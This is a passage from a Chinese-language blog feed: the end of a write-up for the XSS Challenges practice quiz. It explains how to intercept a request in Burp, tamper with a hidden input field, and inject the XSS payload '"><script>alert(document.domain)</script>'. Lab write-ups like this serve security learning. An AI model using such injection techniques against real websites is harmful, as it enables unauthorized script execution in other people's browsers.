<code>text</code>：定义单行的输入字段，用户可在其中输入文本。默认宽度为 20 个字符</p></blockquote><p>▣ 从上图我们可以得到，有一个 <code>&lt;input&gt;</code> 标签被隐藏掉了，所以我们在网页中无法找见它，但是我们可以在 <code>burp</code> 改包，来进行 <code>xss</code>  攻击，攻击脚本如下：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：<span class="string">"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>效果如下图：</p><p><img src="/images/89-19.png" alt></p><p>▣ 我们点击 <code>Forward</code> 以后，可以看到我们成功的执行了 <code>xss</code> 攻击：</p><p><img src="/images/89-20.png" alt></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;题目链接：&lt;a href=&quot;http://xss-quiz.int21h.jp/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;XSS Challenges（共19关）&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="XSS" scheme="https://muzibing.github.io/tags/XSS/"/>
    
  </entry>
  
</feed>
